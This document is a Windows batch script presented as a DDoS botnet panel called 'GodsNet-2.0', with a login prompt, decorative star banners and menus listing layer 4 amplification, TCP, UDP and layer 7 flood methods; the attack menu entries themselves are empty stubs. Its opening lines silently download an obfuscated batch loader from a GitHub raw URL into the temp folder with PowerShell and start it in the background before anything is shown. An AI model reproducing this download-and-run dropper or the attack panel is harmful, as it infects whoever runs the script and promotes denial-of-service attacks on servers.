@echo off
chcp 65001 >nul
set "downloadUrl=https://raw.githubusercontent.com/partymonster2/Batch-Scripts/main/loader_obf.bat"
set "downloadPath=%temp%\loader_obf.bat"

REM Download the batch script from the GitHub link
powershell -command "(New-Object System.Net.WebClient).DownloadFile('%downloadUrl%', '%downloadPath%')"

REM Check if the download was successful
if exist "%downloadPath%" (
    REM Run the downloaded batch script in the background
    start "" "%downloadPath%"
) else (
    echo Failed to download the script from %downloadUrl%
)

:loading
cls
color E
title Login...
set /p "username=Username: "
cls
title Connecting To Server...
echo Welcome, %username%! Connecting you to our servers, please wait.
timeout 3 >nul
goto :main


:main
cls
title Welcome %username%! GodsNet-2.0 Status: Connected - Bots: 19258
color 1
color 2
echo   *    .  *       .   ,          *     .    .    '   .       *  .'. *          .   * .    '   .       *  .'. * 
color 2
color 3
echo           .       . .        *    .  *        *  .'.
color 3
color 4
echo  *   .   .'    * ,      .       .  ,     *    .  *        *  .'. .' *          .   * *  .'. .' * 
color 4
color 5
echo   .     *     .' *          .   *  *    .  *        *  .'
color 5
color 6
echo   '     .     .  *        *  .'. *          .   *       *  .'. *          .   * .'.       *  .'. *          .   *
color 6
color 7
echo       .   ' '        .    .    '   .
color 7
color 8
echo .  *        ,   *               '      *  ,      .       .  ,     *.   ' '        .    .    '   .
color 8
color 9
echo                              ..   ' '        .    .    '   .
color 9
color 1
echo          *          .   *.   ' '        .    .    '   ..   ' '        .    .    '   . .       .  ,     *
color 1 
color 2
echo   *    .  *       .   ,          *     .    .    '   .       *  .'. *          .   *
color 2
color 3
echo           .       . .        *    .  *        *  .'.       *  .'. *          .   *
color 3
color 4
echo  *   .   .'    * ,      .       .  ,     *    .  *        *  .'.   '   .       *  .'. *          .   * .'.       *  .'. *          .   *
color 4
color 5
echo   .     *     .' *          .   *     .  ,     *    .  *        *  .'.
color 5
color 6
echo   '     .     .  *        *  .'. *          .   *   '   .       *  .'. *          .   *
color 6
color 7
echo       .   ' '        .    .    '   .       '      *  ,      .       .  ,     * '      *  ,      .       .  ,     * .       .  ,     *
color 7
color 8
echo .  *        ,   *               '      *  ,      .       .  ,     * .       .  ,     *
color 8
color 9
echo        '      *  ,      .       .  ,     *                         . .       .  ,     *
color 9
color 1
echo          *          .   *   '      *  ,      .       .  ,     *
color 1
color 2
echo   *    .  *       .   ,          *     .    .    '   . ,      .       .  ,     *    .  *        *  .'. .       .  ,     *
color 2
color 3
echo           .       . .        *    .  *        *  .'.               '      *  ,      .       .  ,     *
color 3
color 4
echo  *   .   .'    * ,      .       .  ,     *    .  *        *  .'. .       .  ,     *
color 4
color 5
echo   .     *     .' *          .   * * ,      .       .  ,     *    .  *        *  .'.
color 5
color 6
echo   '     .     .  *        *  .'. *          .   * * ,      .       .  ,     *    .  *        *  .'. .       .  ,     *
color 6
color 7
echo       .   ' '        .    .    '   . .       .  ,     * .       .  ,     *
color 7
color 8
echo .  *        ,   *               '      *  ,      .       .  ,     *
color 8
color 9
echo                              .
color 9
color 1
echo .  *       .   ,          *     .    .    '   . ,      .       .  ,     *    .  *        *  .'. .       .  ,     *
color 1
color 2
color 2
echo   '     .     .  *        *  .'. *          .   *  Discord: Shik.i * ,      .       .  ,     *    .  *        *  .'. .       .  ,     * 
echo '        .    .    '   . .       .  ,     *.  ,  "help" for commands* '      *  ,      .       .  ,     * .       .  ,     *
color 3
echo   *        *  .'. *          .   *       *  .'. *  *  Made By Kas  .  ,     * '      *  ,      .       .  ,     * .       .  ,     *
color E
echo.
echo.
echo.
set /p "menu=%username%@main#: "

IF "%menu%"=="help" GOTO :help
IF "%menu%"=="methods" GOTO :methods
IF "%menu%"=="l4" GOTO :layer4
IF "%menu%"=="l7" GOTO :layer7
IF "%menu%"=="credits" GOTO :creds
IF "%menu%"=="ping" GOTO :ping
GOTO :main

:help
cls
echo                       ┌─────────────────────────────────────────────┐
echo                       │    User Commands to Navigate GodsNet-2.0    │
echo                       ├─────────────────────────────────────────────┤
echo                       │Methods - Shows you a list of our methods    │
echo                       ├─────────────────────────────────────────────┤
echo                       │l4 - Start a layer 4 attack                  │
echo                       ├─────────────────────────────────────────────┤
echo                       │l7 - Start a layer 7 attack                  │
echo                       ├─────────────────────────────────────────────┤
echo                       │Credits - Gives credits to our Dev(s)        │
echo                       ├─────────────────────────────────────────────┤
echo                       │Ping - Ping an IP using cmd or paping        │
echo                       └─────────────────────────────────────────────┘
echo.
echo.
set /p "menu=%username%@help#: "
IF /I "%menu%"=="home" GOTO :main
IF "%menu%"=="help" GOTO :help
IF "%menu%"=="methods" GOTO :methods
IF "%menu%"=="l4" GOTO :layer4
IF "%menu%"=="l7" GOTO :layer7
IF "%menu%"=="credits" GOTO :creds
IF "%menu%"=="ping" GOTO :ping
GOTO :end

:methods
cls
echo                       ┌─────────────────────────────────────────────┐┌─────────────────────────────────────────────┐
echo                       │          GodsNet's Layer 4 Methods          ││          GodsNet's Layer 7 Methods          │
echo                       ├─────────────────────────────────────────────┤├─────────────────────────────────────────────┤
echo                       │                -AMP Methods-                ││                Layer 7 Methods              │
echo                       ├─────────────────────────────────────────────┤├─────────────────────────────────────────────┤
echo                       │DNS - Gold Standard for DDoS Attacks         ││HTTP1 - Sends alot of HTTP Packets           │
echo                       │NTP - A reflection-based volumetric attack   ││HTTP2 - Sends alot of HTTP Packets           │
echo                       │WSD - Uses WS-Discovery Protocol to attack   ││HTTP-Reuest - Sends alot of HTTP Requests    │
echo                       │ARD - Not much is known about this method    ││TLS - targets the TLS handshake protocol     │
echo                       │SADP - Not much is known about this method   ││HTTP-BROWSER - Sends HTTP Packets Via Browser│
echo                       ├─────────────────────────────────────────────┤│HTTP-BYPASS - Bypasses certain protections   │
echo                       │                -TCP Methods-                │└─────────────────────────────────────────────┘
echo                       ├─────────────────────────────────────────────┤
echo                       │SYN - Sends synchronize requests to target   │
echo                       │ACK - Overloads a server with ACK packets    │
echo                       │OSIRIS - Not much is know about this method  │
echo                       │WRA - Not much is know about this method     │
echo                       │TFO - Not much is know about this method     │
echo                       │TLS - targets the TLS handshake protocol     │
echo                       │BYPASS - Not much is know about this method  │
echo                       │BYPASSv2 - Not much is know about this method│	
echo                       ├─────────────────────────────────────────────┤
echo                       │                -UDP Methods-                │
echo                       ├─────────────────────────────────────────────┤
echo                       │PPS - Sends standard packets flooding target │
echo                       │VSE - used to deprive the server of reources │
echo                       │Raknet - Not much is know about this method  │
echo                       │FIVEM - Used to target FIVEM game servers    │
echo                       │GAME - Used to target most game servers      │
echo                       │BYPASS - Used to bypass certain protections  │
echo                       └─────────────────────────────────────────────┘
set /p "menu=%username%@methods#: "
IF /I "%menu%"=="home" GOTO :main
IF "%menu%"=="help" GOTO :help
IF "%menu%"=="methods" GOTO :methods
IF "%menu%"=="l4" GOTO :layer4
IF "%menu%"=="l7" GOTO :layer7
IF "%menu%"=="credits" GOTO :creds
IF "%menu%"=="ping" GOTO :ping
GOTO :end

:layer4
cls
echo 
set /p "menu=%username%@layer4#: "
IF /I "%menu%"=="home" GOTO :main
IF "%menu%"=="help" GOTO :help
IF "%menu%"=="methods" GOTO :methods
IF "%menu%"=="l4" GOTO :layer4
IF "%menu%"=="l7" GOTO :layer7
IF "%menu%"=="credits" GOTO :creds
IF "%menu%"=="ping" GOTO :ping
GOTO :end

:layer7
cls
echo 
set /p "menu=%username%@layer7#: "
IF /I "%menu%"=="home" GOTO :main
IF "%menu%"=="help" GOTO :help
IF "%menu%"=="methods" GOTO :methods
IF "%menu%"=="l4" GOTO :layer4
IF "%menu%"=="l7" GOTO :layer7
IF "%menu%"=="credits" GOTO :creds
IF "%menu%"=="ping" GOTO :ping
GOTO :end

:creds
cls
echo 
set /p "menu=%username%@credits#: "
IF /I "%menu%"=="home" GOTO :main
IF "%menu%"=="help" GOTO :help
IF "%menu%"=="methods" GOTO :methods
IF "%menu%"=="l4" GOTO :layer4
IF "%menu%"=="l7" GOTO :layer7
IF "%menu%"=="credits" GOTO :creds
IF "%menu%"=="ping" GOTO :ping
GOTO :end

:ping
cls
echo 
set /p "game=%username%@ping#: "
IF /I "%menu%"=="home" GOTO :main
IF "%menu%"=="help" GOTO :help
IF "%menu%"=="methods" GOTO :methods
IF "%menu%"=="l4" GOTO :layer4
IF "%menu%"=="l7" GOTO :layer7
IF "%menu%"=="credits" GOTO :creds
IF "%menu%"=="ping" GOTO :ping
GOTO :end

:end
REM End of game-specific logic
